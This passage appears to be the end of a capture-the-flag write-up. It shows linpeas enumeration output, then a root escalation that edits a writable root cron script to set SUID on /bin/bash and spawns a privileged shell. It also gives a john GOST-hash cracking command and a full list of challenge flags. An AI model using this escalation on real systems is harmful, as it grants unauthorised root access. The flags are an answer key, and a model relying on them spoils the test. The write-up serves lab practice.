/usr/share/help/eu/evince/password.page
/usr/share/help/fi/evince/password.page
/usr/share/help/fi/file-roller/password-protection.page
/usr/share/help/fi/file-roller/troubleshooting-password.page
/usr/share/help/fr/evince/password.page
/usr/share/help/fr/file-roller/password-protection.page
/usr/share/help/fr/file-roller/troubleshooting-password.page
/usr/share/help/gl/evince/password.page
/usr/share/help/gl/file-roller/password-protection.page
/usr/share/help/gl/file-roller/troubleshooting-password.page
/usr/share/help/hu/evince/password.page
/usr/share/help/hu/file-roller/password-protection.page
/usr/share/help/hu/file-roller/troubleshooting-password.page
/usr/share/help/id/evince/password.page
/usr/share/help/id/file-roller/password-protection.page
/usr/share/help/id/file-roller/troubleshooting-password.page
/usr/share/help/it/evince/password.page
/usr/share/help/ja/evince/password.page
/usr/share/help/ja/file-roller/password-protection.page
/usr/share/help/ja/file-roller/troubleshooting-password.page
/usr/share/help/ko/evince/password.page
/usr/share/help/ko/file-roller/password-protection.page
/usr/share/help/ko/file-roller/troubleshooting-password.page
/usr/share/help-langpack/en_GB/empathy/irc-nick-password.page
/usr/share/help-langpack/en_GB/evince/password.page
/usr/share/help-langpack/en_GB/zenity/password.page
/usr/share/help/lv/evince/password.page
/usr/share/help/nl/evince/password.page
/usr/share/help/oc/evince/password.page
/usr/share/help/pl/evince/password.page
/usr/share/help/pl/file-roller/password-protection.page
/usr/share/help/pl/file-roller/troubleshooting-password.page
/usr/share/help/pt_BR/evince/password.page
/usr/share/help/pt_BR/file-roller/password-protection.page

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                                                                            
╔══════════╣ Searching passwords inside logs (limit 70)
2018-04-26 18:18:15 configure base-passwd:amd64 3.5.44 3.5.44                                                                                                                                                                               
2018-04-26 18:18:15 install base-passwd:amd64 <none> 3.5.44
2018-04-26 18:18:15 status half-configured base-passwd:amd64 3.5.44
2018-04-26 18:18:15 status half-installed base-passwd:amd64 3.5.44
2018-04-26 18:18:15 status installed base-passwd:amd64 3.5.44
2018-04-26 18:18:15 status unpacked base-passwd:amd64 3.5.44
2018-04-26 18:18:17 status half-configured base-passwd:amd64 3.5.44
2018-04-26 18:18:17 status half-installed base-passwd:amd64 3.5.44
2018-04-26 18:18:17 status unpacked base-passwd:amd64 3.5.44
2018-04-26 18:18:17 upgrade base-passwd:amd64 3.5.44 3.5.44
2018-04-26 18:18:22 install passwd:amd64 <none> 1:4.5-1ubuntu1
2018-04-26 18:18:22 status half-installed passwd:amd64 1:4.5-1ubuntu1
2018-04-26 18:18:22 status unpacked passwd:amd64 1:4.5-1ubuntu1
2018-04-26 18:18:23 configure base-passwd:amd64 3.5.44 <none>
2018-04-26 18:18:23 status half-configured base-passwd:amd64 3.5.44
2018-04-26 18:18:23 status unpacked base-passwd:amd64 3.5.44
2018-04-26 18:18:24 status installed base-passwd:amd64 3.5.44
2018-04-26 18:18:26 configure passwd:amd64 1:4.5-1ubuntu1 <none>
2018-04-26 18:18:26 status half-configured passwd:amd64 1:4.5-1ubuntu1
2018-04-26 18:18:26 status installed passwd:amd64 1:4.5-1ubuntu1
2018-04-26 18:18:26 status unpacked passwd:amd64 1:4.5-1ubuntu1
2020-06-14 14:31:11 status half-configured passwd:amd64 1:4.5-1ubuntu1
2020-06-14 14:31:11 status half-installed passwd:amd64 1:4.5-1ubuntu1
2020-06-14 14:31:11 status unpacked passwd:amd64 1:4.5-1ubuntu1
2020-06-14 14:31:11 upgrade passwd:amd64 1:4.5-1ubuntu1 1:4.5-1ubuntu2
2020-06-14 14:31:14 configure passwd:amd64 1:4.5-1ubuntu2 <none>
2020-06-14 14:31:14 status half-configured passwd:amd64 1:4.5-1ubuntu2
2020-06-14 14:31:14 status half-installed passwd:amd64 1:4.5-1ubuntu1
2020-06-14 14:31:14 status installed passwd:amd64 1:4.5-1ubuntu2
2020-06-14 14:31:14 status unpacked passwd:amd64 1:4.5-1ubuntu2
 base-passwd depends on libc6 (>= 2.8); however:
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
Binary file /var/log/journal/1ed81d5ac22b46c4975417b057b1933e/user-1000.journal matches
dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
Selecting previously unselected package base-passwd.
Selecting previously unselected package passwd.
Setting up base-passwd (3.5.44) ...
Setting up passwd (1:4.5-1ubuntu1) ...
Shadow passwords are now on.
Unpacking base-passwd (3.5.44) ...
Unpacking base-passwd (3.5.44) over (3.5.44) ...
Unpacking passwd (1:4.5-1ubuntu1) ...



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════      
```

We notice this interesting line
```
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

A cronjob ran as root, executing a shell script from ```/var/www/``` where we could have write permission.
```
boring@kral4-PC:/var/www$ ls -al
total 16
drwxr-xr-x  3 root   root   4096 Jun 15  2020 .
drwxr-xr-x 14 root   root   4096 Jun 13  2020 ..
drwxr-xr-x  4 root   root   4096 Jun 15  2020 html
-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh
```

We have permissions indeed. Let's modify it to get ```/bin/bash``` suid
```
chmod +s /bin/bash
```

Which after few seconds set the SUID
```
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

Let's start a bash with privileges
```
boring@kral4-PC:/var/www$ /bin/bash -p
bash-4.4# whoami

root
```

Let's get the flag
```
bash-4.4# cat /root/.root.txt

flag{63a9f0ea7bb98050796b649e85481845}
```

## Flag

1. Flag 1

```
flag{f1rs7_fl4g} 
```

2. Flag 2

```
flag{1m_s3c0nd_fl4g}
```

3. Flag 3

```
flag{9fdafbd64c47471a8f54cd3fc64cd312}
```

4. User

```
flag{n0wits33msn0rm4l}
```

5. Privesc

```
flag{63a9f0ea7bb98050796b649e85481845}
```

## To Go Further

In the steganography part, although ```stegseek``` found the password, it was possible to use ```john``` to crack it, using the hint in the challenge
```
GOST Hash john --wordlist=easypeasy.txt --format=gost hash
```

I'm not sure how we were supposed to know it's a GOST hash though, has all analyses I performed told me it was a SHA-256.
